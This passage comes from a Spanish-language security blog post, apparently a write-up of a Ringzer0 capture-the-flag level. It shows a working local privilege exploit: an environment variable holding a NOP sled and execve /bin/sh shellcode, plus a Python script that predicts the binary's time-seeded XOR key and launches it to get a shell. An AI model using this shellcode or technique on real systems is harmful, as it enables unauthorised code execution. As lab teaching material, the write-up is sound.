flujo de ejecución se vería forzado a continuar por una cola de <b>NOPS </b>hasta llegar a la shellcode alojada al final de la cola.<br /><br />De esta forma eliminaría totalmente la posibilidad de corromper la ejecución y forzosamente debería obtener shell:<br /><br />Para esto modifique mi variable de entorno de la siguiente forma:</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><b>$ export SecuritySignal=$(python -c "print '\x90'*500+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">obtuve la dirección de memoria con <b>/tmp/getenv SecuritySignal (</b><b>0xbffffd44</b><b>)&nbsp;</b>y la agregué en mi expoit:</div><div style="text-align: center;"><b><br /></b></div><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-bwvdl2wwBZc/Vo4ncF1dYsI/AAAAAAAAA4I/cMcA7uZfR-4/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A52%253A51.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="210" src="http://3.bp.blogspot.com/-bwvdl2wwBZc/Vo4ncF1dYsI/AAAAAAAAA4I/cMcA7uZfR-4/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A52%253A51.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">En este punto la ansiedad me estaba matando, así que cruce los dedos y largue el ataque:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-duIsV0P4A-s/Vo4phL5QMKI/AAAAAAAAA4U/Z7qNvsVRoE4/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B06%253A01%253A28.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="74" src="http://2.bp.blogspot.com/-duIsV0P4A-s/Vo4phL5QMKI/AAAAAAAAA4U/Z7qNvsVRoE4/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B06%253A01%253A28.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">y por fin y luego de mucho esfuerzo y de todo el tiempo necesario para que rand() se dignara a darnos key 21, hemos logrado obtener shell con permisos de level5! Solo resta leer el flag :)</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><b>TIPS:</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;">La memoria muchas veces nos juega malas pasadas, algunas recomendaciones de mi parte:&nbsp;</div><div style="text-align: left;"><br /></div><div style="text-align: left;">1) Utilicen nombres de variables de entorno simil a las existentes.</div><div style="text-align: left;">2) Si su exploit no funciona prueben cambiando el nombre de la variable de entorno y obteniendo nuevamente la dirección de memoria</div><div style="text-align: left;">3) Prueben distintos largos de nopsleed previo shellcode<br /><br /><br /><b>Actualización 09/01/2016:</b><br /><b><br /></b>Revisando el código fuente del binario a explotar, y profundizando en la importación de librerías C en python, pude llegar a una solución optima:<br /><br /></div><pre class="brush: py">void parse_buffer(char *buffer) {<br />    <span style="color: red;">srand(time(NULL));<br />    char key = (unsigned char)(rand());</span><br />    int i, size = strlen(buffer);<br />    for(i = 0; i &lt; size; i++) {<br />        buffer[i] = (char)buffer[i] ^ key;<br />    }<br />}<br /><br /></pre><div style="text-align: left;">Si observamos las 2 primeras lineas de esta función, podemos ver que la función srand(), responsable de la creación de la semilla para la generación de números aleatorios, utiliza como parámetro la función time(NULL);<br /><br />Time(NULL) retorna la hora actual del sistema en segundos, la cual es tomada como parámetro de la semilla para luego con el uso de&nbsp;rand(); generar un numero aleatorio.<br /><br />Ya que estamos tratando con un <b>unsigned char</b>&nbsp;el número aleatorio se vera limitado entre los valores&nbsp;0 y 255, o lo que es igual a 256 combinaciones posibles.<br /><br />Una vez obtenido este numero se utiliza como key de cifrado del buffer.<br /><br /><b>Conclusión:</b><br /><br />Si en nuestro exploit logramos obtener el tiempo exacto en segundos del sistema, generar la semilla, el key de cifrado, cifrar el payload y ejecutar el binario a explotar antes de que pase un segundo, garantizaremos que el numero KEY RANDOM generado por el binario sera el mismo el cual generamos desde nuestro exploit ya que ambos utilizaran como semilla el mismo tiempo del sistema.<br /><br />Esto se debe a que la funcion rand() genera números psudo-aleatorios que dependen directamente de la semilla, por lo que si 2 programas poseen la misma semilla, rand() generará el mismo número "aleatorio" en ambos programas.<br /><br />Las funciones srand(), rand() y time() son propias de <b>libc</b>, y debido a esto solo deberían ser accesibles desde otro programa escrito en <b>C</b>.<br /><br />Pero afortunadamente python posee la librería <a href="https://docs.python.org/2/library/ctypes.html" style="font-weight: bold;">ctypes</a>, el cual provee estructuras de datos compatibles entre ambos lenguajes y permite utilizar funciones de librerías del sistema dentro de python.<br /><br />Por medio de ctypes realizaremos la generación de la misma semilla y el mismo key random que el binario, cifraremos nuestro payload y ejecutaremos el binario.<br /><br />De esta forma el exploit sera valido el 99% de las veces que el reloj del sistema repita la misma hora tanto en el exploit como en el binario.<br /><br />Nuestro exploit solo fallara cuando la diferencia del reloj entre la ejecución del exploit y la del binario varíe en pocos milisegundos.<br /><br />Supongamos que nuestro exploit se ejecuta a las 00:00:00:59 ms, al realizar el proceso de obtener la semilla, obtendremos un numero random correspondiente a 00:00:00 pero al llegar a la ejecución del binario el reloj del sistema estará en 00:00:01, por lo que el KEY del binario sera distinto al que nosotros obtuvimos.<br /><br />Todas las veces que esto <b>no suceda</b> nuestro exploit funcionara &nbsp;correctamente.<br /><br />Código:<br /><br /><pre class="brush: py">import os<br />import struct<br />from ctypes import *<br /><br />libc = CDLL("libc.so.6");<br /><br />def xor_enc(inside):<br /> payload = "";<br /> libc.srand(libc.time())<br /> key = (libc.rand() % 256) # %256 limita el valor de rand() entre 0 y 255 valor que puede tomar unsigned char<br /> for letter in inside:<br />  payload = payload + str(chr(ord(letter) ^ int(key)));<br /> return payload;<br /><br />address = 0xbffffeda; #Address of SHELLCODE enviroment variable  <br />sleed1 = 'TEST'+'\x90'*8<br />sleed2 = '\x90'*240<br /><br />try:<br /> hex_add = struct.pack('&lt;I',address)<br /><br /> payload = sleed1+hex_add+sleed2<br /> arg = xor_enc(payload)<br /><br /> print str(hex(ord(hex_add[3]))) + str(hex(ord(hex_add[2]))).replace('0x','') + str(hex(ord(hex_add[1]))).replace('0x','') + str(hex(ord(hex_add[0]))).replace('0x','');<br /><br /> os.system('/levels/level4 '+arg) #Change executable file to /levels/level4<br />except:<br /> print "Exploit Fail"<br /><br /></pre><br />Como resultado, obtenemos en la primera ejecución nuestra preciada shell:<br /></div><div style="text-align: right;"><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-v3tQXDsrkOY/VpGEp5sVWyI/AAAAAAAAA4k/BsxuJXmwUnk/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-09%2B19%253A04%253A46.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="94" src="http://1.bp.blogspot.com/-v3tQXDsrkOY/VpGEp5sVWyI/AAAAAAAAA4k/BsxuJXmwUnk/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-09%2B19%253A04%253A46.png" width="640" /></a></div><br />Happy Hunting!</div></div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>

      




<time class='entry-date' datetime='2016-01-07T01:21:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>1:21 am</span></time>
      


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/" data-via="" data-counturl="http://securitysignal.github.io/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/12/30/securitysocket-remote-exploit-library/" title="Previous Post: SecuritySocket Remote Exploit Library">&laquo; SecuritySocket Remote Exploit Library</a>
      
      
        <a class="basic-alignment right" href="/blog/2016/03/08/format-string-atack/" title="Next Post: Format String Atack">Format String Atack &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2016 - q3rv0 - hdbreaker -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
